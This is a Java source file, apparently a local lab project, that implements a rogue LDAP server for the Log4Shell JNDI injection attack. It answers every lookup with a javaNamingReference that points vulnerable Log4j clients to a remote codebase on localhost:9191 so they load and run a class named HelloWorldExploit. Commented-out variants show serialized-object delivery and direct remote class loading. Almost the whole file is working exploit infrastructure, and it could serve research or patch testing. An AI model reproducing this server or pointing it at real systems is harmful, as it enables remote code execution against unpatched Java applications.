package com.example.log4jtest;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;
import java.time.LocalDateTime;
import java.util.Base64;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedWebappClassLoader;

public class LdapServer {

  public static void main(String[] args) throws IOException {
//    try {
//      // URL к JAR-файлу, содержащему класс
//      URL jarUrl = new URL("http://localhost:9191/test");
//
//      // Создаем URLClassLoader с URL JAR-файла
//      try (URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{jarUrl},
//          TomcatEmbeddedWebappClassLoader.class.getClassLoader())) {
//        // Полное имя класса, который нужно загрузить
//        String className = "com.example.log4jtest.HelloWorldExploit";
//
//        // Загружаем класс
//        Class<?> loadedClass = urlClassLoader.loadClass(className);
//
//        // Создаем экземпляр загруженного класса
//        Object instance = loadedClass.getDeclaredConstructor().newInstance();
//      }
//    } catch (Exception e) {
//      e.printStackTrace();
//    }


    try {
      InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=Test");
      int port = 9090;
      config.setListenerConfigs(new InMemoryListenerConfig(
          "listen", //$NON-NLS-1$
          InetAddress.getByName("127.0.0.1"), //$NON-NLS-1$
          port,
          ServerSocketFactory.getDefault(),
          SocketFactory.getDefault(),
          (SSLSocketFactory) SSLSocketFactory.getDefault()));

      config.addInMemoryOperationInterceptor(new OperationInterceptor());
      InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
      System.out.println(
          LocalDateTime.now() + " [LDAPSERVER] >> Listening on 0.0.0.0:" + port); //$NON-NLS-1$
      ds.startListening();


    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public static class OperationInterceptor extends InMemoryOperationInterceptor {

    private URL codebase = new URL("http://localhost:9191/test");

    public OperationInterceptor() throws MalformedURLException {
    }

    @Override
    public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
      String base = result.getRequest().getBaseDN();
      Entry e = new Entry(base);
      try {
        sendResult(result, base, e);
      }
      catch ( Exception e1 ) {
        e1.printStackTrace();
      }
    }

    protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
//      URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
      System.out.println("Send LDAP reference result for " + base + " redirecting to " + codebase);
      e.addAttribute("javaClassName", "foo");
      String cbstring = this.codebase.toString();
      int refPos = cbstring.indexOf('#');
      if ( refPos > 0 ) {
        cbstring = cbstring.substring(0, refPos);
      }
      e.addAttribute("javaCodeBase", "http://localhost:9191/");
      e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
      e.addAttribute("javaFactory", "HelloWorldExploit");
      result.sendSearchEntry(e);
      result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

//    @Override
//    public void processSearchResult(InMemoryInterceptedSearchResult result) {
//      Entry e = new Entry("");
//
//      HelloWorldExploit helloWorldExploit = new HelloWorldExploit();
//      ByteArrayOutputStream bos = new ByteArrayOutputStream();
//      try (ObjectOutputStream o = new ObjectOutputStream(bos);) {
//        o.writeObject(helloWorldExploit);
//      } catch (IOException ex) {
//        throw new RuntimeException(ex);
//      }
//      e.addAttribute("javaClassName", "com.example.log4jtest.HelloWorldExploit");
//      e.addAttribute("javaCodeBase", "http://localhost:9191/test");
//      e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
//      e.addAttribute("javaSerializedData", bos.toByteArray()); //$NON-NLS-1$
////      e.addAttribute("javaSerializedData", "��\u0000\u0005sr\u0000'com.example.log4jtest.HelloWorldExploit(dl'\\N؞\u0002\u0000\u0000xp"); //$NON-NLS-1$
//      try {
//        result.sendSearchEntry(e);
//        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
//      } catch (LDAPException ex) {
//        throw new RuntimeException(ex);
//      }
//    }
  }
}
